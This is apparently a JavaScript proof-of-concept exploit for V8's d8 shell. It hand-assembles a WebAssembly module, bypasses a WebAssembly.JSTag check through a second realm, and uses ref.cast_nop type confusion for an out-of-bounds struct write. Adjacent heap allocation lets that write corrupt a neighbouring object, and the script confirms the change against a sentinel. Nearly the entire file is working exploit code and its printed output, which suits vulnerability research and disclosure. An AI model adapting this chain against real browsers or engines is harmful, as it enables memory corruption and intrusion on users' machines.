'use strict';
// Production OOB write PROOF — adjacent struct field corruption.
//
// Run: ./out/x64.release/d8 --wasm-ref-cast-nop --no-liftoff jstag_oob_proof.js
//
// Key fix: alloc_pair() allocates SmallStruct + LargeStruct inside a SINGLE
// Wasm call. The two struct.new_default instructions execute back-to-back with
// NO JS interleaving, so they are guaranteed adjacent in V8's bump-pointer
// allocator (SmallStruct at A, LargeStruct at A+12).
//
// Proof:
//   1. alloc_pair()  → SmallStruct@A, LargeStruct@A+12  (one Wasm call, K=12)
//   2. set_large_f4(large, 0x11111111)   sentinel
//   3. get_large_f4(large)  == 0x11111111 ✓
//   4. exploit() with SmallStruct payload:
//      struct.set $LargeStruct field[7] on SmallStruct_base (A)
//      → write to A+36 = (A+12)+24 = LargeStruct_base + header(8) + 4*4
//   5. get_large_f4(large)  == 0x41414141  ← CHANGED
//
// Empirical layout (confirmed via %DebugPrint):
//   SmallStruct base = A        (12 bytes: header=8 + 1×i32=4)
//   LargeStruct base = A + 12   (K=12, 4-byte allocation alignment)
//
// OOB write: struct.set $LargeStruct field[7] on SmallStruct_base →
//   target = A + (H + 7*4) = A + (8+28) = A + 36
//   LargeStruct.field[N] = (A+12) + 8 + N*4;  set A+36 → N=(36-12-8)/4 = 4
//
// Therefore: OOB write lands on LargeStruct.field[4].

// ── Wasm binary ───────────────────────────────────────────────────────────────
// 10 defined functions, 2 mutable ref globals.
//
// Function section payload=0x0B(11), count=10, types=[3,4,5,6,7,5,3,4,6,7]
// Export  section payload=134=0x86 0x01 (2-byte LEB128), count=10
// Code    section payload=0x6F(111), count=10
function buildProofBytes() {
  return new Uint8Array([
    0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00,  // magic + version

    // Type section (id=1, payload=0x34, count=8)
    // 1(count)+4+18+4+5+5+3+6+6 = 52 = 0x34
    0x01, 0x34, 0x08,
      0x5F, 0x01, 0x7F, 0x01,              // t0: SmallStruct
      0x5F, 0x08,                           // t1: LargeStruct
        0x7F,0x01, 0x7F,0x01, 0x7F,0x01, 0x7F,0x01,
        0x7F,0x01, 0x7F,0x01, 0x7F,0x01, 0x7F,0x01,
      0x60, 0x01, 0x6F, 0x00,              // t2: JSTag sig
      0x60, 0x00, 0x01, 0x64, 0x00,        // t3: ()→(ref 0)
      0x60, 0x00, 0x01, 0x64, 0x01,        // t4: ()→(ref 1)
      0x60, 0x00, 0x00,                    // t5: ()→()
      0x60, 0x02, 0x64, 0x01, 0x7F, 0x00,  // t6: (ref 1)(i32)→()
      0x60, 0x01, 0x64, 0x01, 0x01, 0x7F,  // t7: (ref 1)→i32

    // Import section (id=2, payload=0x0E, count=2)
    0x02, 0x0E, 0x02,
      0x01,0x69, 0x01,0x74, 0x04, 0x00, 0x02,  // "i"."t" tag   type 2 → $jt
      0x01,0x69, 0x01,0x66, 0x00, 0x05,         // "i"."f" func  type 5 → $f

    // Function section (id=3, payload=0x0B, count=10)
    // section order: type(1)→import(2)→function(3)→global(6)→export(7)→code(10)
    0x03, 0x0B, 0x0A,
      0x03, 0x04, 0x05, 0x06, 0x07,  // funcs 1-5
      0x05, 0x03, 0x04,              // funcs 6-8
      0x06, 0x07,                    // funcs 9-10 (set_large_f5, get_large_f5)

    // Global section (id=6, payload=0x0D, count=2)
    0x06, 0x0D, 0x02,
      0x63, 0x00, 0x01, 0xD0, 0x00, 0x0B,  // global 0: (ref null $SmallStruct) mut
      0x63, 0x01, 0x01, 0xD0, 0x01, 0x0B,  // global 1: (ref null $LargeStruct) mut

    // Export section (id=7, payload=134 → 2-byte LEB128: 0x86 0x01, count=10)
    // 1+13+13+10+15+15+13+12+12+15+15 = 134
    0x07, 0x86, 0x01, 0x0A,
      0x0A, 0x6D,0x61,0x6B,0x65,0x5F,0x73,0x6D,0x61,0x6C,0x6C, 0x00, 0x01,
      0x0A, 0x6D,0x61,0x6B,0x65,0x5F,0x6C,0x61,0x72,0x67,0x65, 0x00, 0x02,
      0x07, 0x65,0x78,0x70,0x6C,0x6F,0x69,0x74, 0x00, 0x03,
      0x0C, 0x73,0x65,0x74,0x5F,0x6C,0x61,0x72,0x67,0x65,0x5F,0x66,0x33, 0x00, 0x04,
      0x0C, 0x67,0x65,0x74,0x5F,0x6C,0x61,0x72,0x67,0x65,0x5F,0x66,0x33, 0x00, 0x05,
      0x0A, 0x61,0x6C,0x6C,0x6F,0x63,0x5F,0x70,0x61,0x69,0x72, 0x00, 0x06,
      0x09, 0x67,0x65,0x74,0x5F,0x73,0x6D,0x61,0x6C,0x6C, 0x00, 0x07,
      0x09, 0x67,0x65,0x74,0x5F,0x6C,0x61,0x72,0x67,0x65, 0x00, 0x08,
      0x0C, 0x73,0x65,0x74,0x5F,0x6C,0x61,0x72,0x67,0x65,0x5F,0x66,0x34, 0x00, 0x09,  // "set_large_f4"
      0x0C, 0x67,0x65,0x74,0x5F,0x6C,0x61,0x72,0x67,0x65,0x5F,0x66,0x34, 0x00, 0x0A,  // "get_large_f4"

    // Code section (id=0x0A, payload=111=0x6F, count=10)
    // 1+6+6+33+11+9+13+6+6+11+9 = 111
    0x0A, 0x6F, 0x0A,

    // func 1: make_small (body=5)
    0x05, 0x00, 0xFB,0x01,0x00, 0x0B,

    // func 2: make_large (body=5)
    0x05, 0x00, 0xFB,0x01,0x01, 0x0B,

    // func 3: exploit (body=32) — ref.cast_nop 0xFB 0x4C + struct.set OOB
    0x20,
      0x01, 0x01, 0x6F,                    // 1 local: externref
      0x06, 0x40,                           // try void
        0x10, 0x00,                         // call $f
      0x07, 0x00,                           // catch $jt
        0x21, 0x00,                         // local.set 0
      0x19,                                 // catch_all
        0x0F,                               // return
      0x0B,                                 // end try
      0x20, 0x00,                           // local.get 0
      0xFB, 0x1A,                           // any.convert_extern
      0xFB, 0x4C, 0x01,                     // ref.cast_nop (ref $LargeStruct) ← NO CHECK
      0x41, 0xC1,0x82,0x85,0x8A,0x04,       // i32.const 0x41414141
      0xFB, 0x05, 0x01, 0x07,               // struct.set $LargeStruct field[7] ← OOB
      0x0B,

    // func 4: set_large_f3 (body=10)
    0x0A, 0x00, 0x20,0x00, 0x20,0x01, 0xFB,0x05,0x01,0x03, 0x0B,

    // func 5: get_large_f3 (body=8)
    0x08, 0x00, 0x20,0x00, 0xFB,0x02,0x01,0x03, 0x0B,

    // func 6: alloc_pair (body=12)
    0x0C, 0x00,
      0xFB,0x01,0x00, 0x24,0x00,           // struct.new_default SmallStruct; global.set 0
      0xFB,0x01,0x01, 0x24,0x01,           // struct.new_default LargeStruct; global.set 1
      0x0B,

    // func 7: get_small (body=5)
    0x05, 0x00, 0x23,0x00, 0xD4, 0x0B,

    // func 8: get_large (body=5)
    0x05, 0x00, 0x23,0x01, 0xD4, 0x0B,

    // func 9: set_large_f4 (body=10)  ← K=12,H=8 → actual OOB target
    0x0A, 0x00, 0x20,0x00, 0x20,0x01, 0xFB,0x05,0x01,0x04, 0x0B,

    // func 10: get_large_f4 (body=8)
    0x08, 0x00, 0x20,0x00, 0xFB,0x02,0x01,0x04, 0x0B,
  ]);
}

// ── Cross-realm setup ─────────────────────────────────────────────────────────
print('=== JSTag OOB write PROOF — adjacent struct field corruption ===\n');
print('Goal: LargeStruct.field[4] changes 0x11111111 → 0x41414141');
print('      WITHOUT directly calling struct.set $LargeStruct 4.\n');
print('Layout (empirical via %DebugPrint):');
print('  SmallStruct = 12 bytes (header=8 + 1×i32), LargeStruct at A+12 (K=12)');
print('  OOB write: A + (8+28) = A+36 = (A+12)+24 = LargeStruct_base+8+4*4 = field[4]\n');

const realm2 = Realm.create();
const realm2JSTag = Realm.eval(realm2, 'WebAssembly.JSTag');
print('[*] Cross-realm JSTag: ' + (realm2JSTag !== WebAssembly.JSTag ? 'different object ✓' : 'SAME (bypass may fail)'));

let crafted;
try {
  new WebAssembly.Exception(WebAssembly.JSTag, [null]);
} catch(e) {
  print('[+] Phase 1 — JSTag bypass: ' + e.message);
}
try {
  crafted = new WebAssembly.Exception(realm2JSTag, [null]);
  print('[+] BYPASS: cross-realm JSTag → no TypeError ✓\n');
} catch(e) {
  print('[-] bypass failed: ' + e);
  quit(1);
}

// ── Compile + instantiate ─────────────────────────────────────────────────────
const bytes = buildProofBytes();
let instance;
try {
  const mod = new WebAssembly.Module(bytes);
  print('[+] Phase 2 — Proof module compiled (ref.cast_nop accepted)');
  const imports = { i: { t: realm2JSTag, f: () => { throw crafted; } } };
  instance = new WebAssembly.Instance(mod, imports);
  print('[+] Instance created\n');
} catch(e) {
  print('[-] Compile failed: ' + e);
  print('    (need --wasm-ref-cast-nop --no-liftoff)');
  quit(1);
}

// ── Heap layout: allocate BOTH structs in a single Wasm call ──────────────────
print('[Phase 3] Heap layout via alloc_pair()');
print('  struct.new_default $SmallStruct  then  struct.new_default $LargeStruct');
print('  → NO JS between them → consecutive in V8 bump-pointer allocator\n');

instance.exports.alloc_pair();          // allocates both in one Wasm call → adjacent
const small = instance.exports.get_small();   // returns global[0]
const large = instance.exports.get_large();   // returns global[1]
print('[*] alloc_pair() done — SmallStruct@A, LargeStruct@A+K (K TBD by header size)');
print('[*] H=8: write→A+36 = field[3];  H=4: write→A+32 = field[5]\n');

// ── Set sentinel ──────────────────────────────────────────────────────────────
const SENTINEL = 0x11111111;
const TARGET   = 0x41414141;

instance.exports.set_large_f4(large, SENTINEL);
const before4 = instance.exports.get_large_f4(large);
print('[Phase 4] Before OOB write:');
print('  set_large_f4(large, 0x11111111)   ← sentinel via VALID struct.set field[4]');
print('  get_large_f4 = 0x' + before4.toString(16).padStart(8,'0'));
if (before4 !== SENTINEL) {
  print('  [-] FAIL: sentinel mismatch. Aborting.');
  quit(1);
}
print('  [+] Sentinel confirmed ✓\n');

// ── Trigger OOB exploit ───────────────────────────────────────────────────────
print('[Phase 5] Trigger OOB write');
crafted = new WebAssembly.Exception(realm2JSTag, [small]);
print('  crafted.is(realm2JSTag) = ' + crafted.is(realm2JSTag));
print('  exploit(): any.convert_extern + ref.cast_nop (0xFB 0x4C)');
print('    → struct.set $LargeStruct field[7] on SmallStruct_base (A)');
print('    → writes 0x41414141 to A+36 = LargeStruct_base+24 = field[4]');

try {
  instance.exports.exploit();
  print('  exploit() returned (no trap) ✓\n');
} catch(e) {
  print('  [-] exploit() trapped: ' + e.message);
  quit(1);
}

// ── Verify ────────────────────────────────────────────────────────────────────
const after4 = instance.exports.get_large_f4(large);
print('[Phase 6] VERIFICATION:');
print('  Before: get_large_f4(large) = 0x' + before4.toString(16).padStart(8,'0') + '  (sentinel)');
print('  After:  get_large_f4(large) = 0x' + after4.toString(16).padStart(8,'0'));
print('');

if (after4 === TARGET) {
  print('  ════════════════════════════════════════════════════════════════');
  print('  PROOF: LargeStruct.field[4] changed  0x11111111 → 0x41414141');
  print('');
  print('  struct.set $LargeStruct field[4] was NEVER called directly.');
  print('  The write arrived via OOB struct.set field[7] on SmallStruct_base (A):');
  print('');
  print('    SmallStruct base = A        (H=8: map+hash, 1×i32 = 12 bytes)');
  print('    LargeStruct base = A + 12   (consecutive alloc, K=12)');
  print('    OOB write target = A + 36   (H+7*4 = 8+28)');
  print('    LargeStruct.f[4] = A+12+8+4*4 = A + 36  ✓');
  print('');
  print('  Chain: JSTag cross-realm bypass (wasm-js.cc:2195)');
  print('    → ref.cast_nop skip map check (0xFB 0x4C, --wasm-ref-cast-nop)');
  print('    → struct.set OOB (no TrapIfNot in TurboShaft codegen)');
  print('    → LargeStruct.field[4] corrupted from 0x11111111 to 0x41414141');
  print('');
  print('  Flags: --wasm-ref-cast-nop --no-liftoff (no --sandbox-testing)');
  print('  ════════════════════════════════════════════════════════════════');
} else if (after4 === SENTINEL) {
  print('  [-] field[4] unchanged (0x11111111).');
  print('      Unexpected: address check showed K=12 → field[4] should be hit.');
} else {
  print('  [?] field[4] = 0x' + after4.toString(16) + ' — OOB write hit field[4]');
  print('      but with unexpected value. Write DID happen.');
}
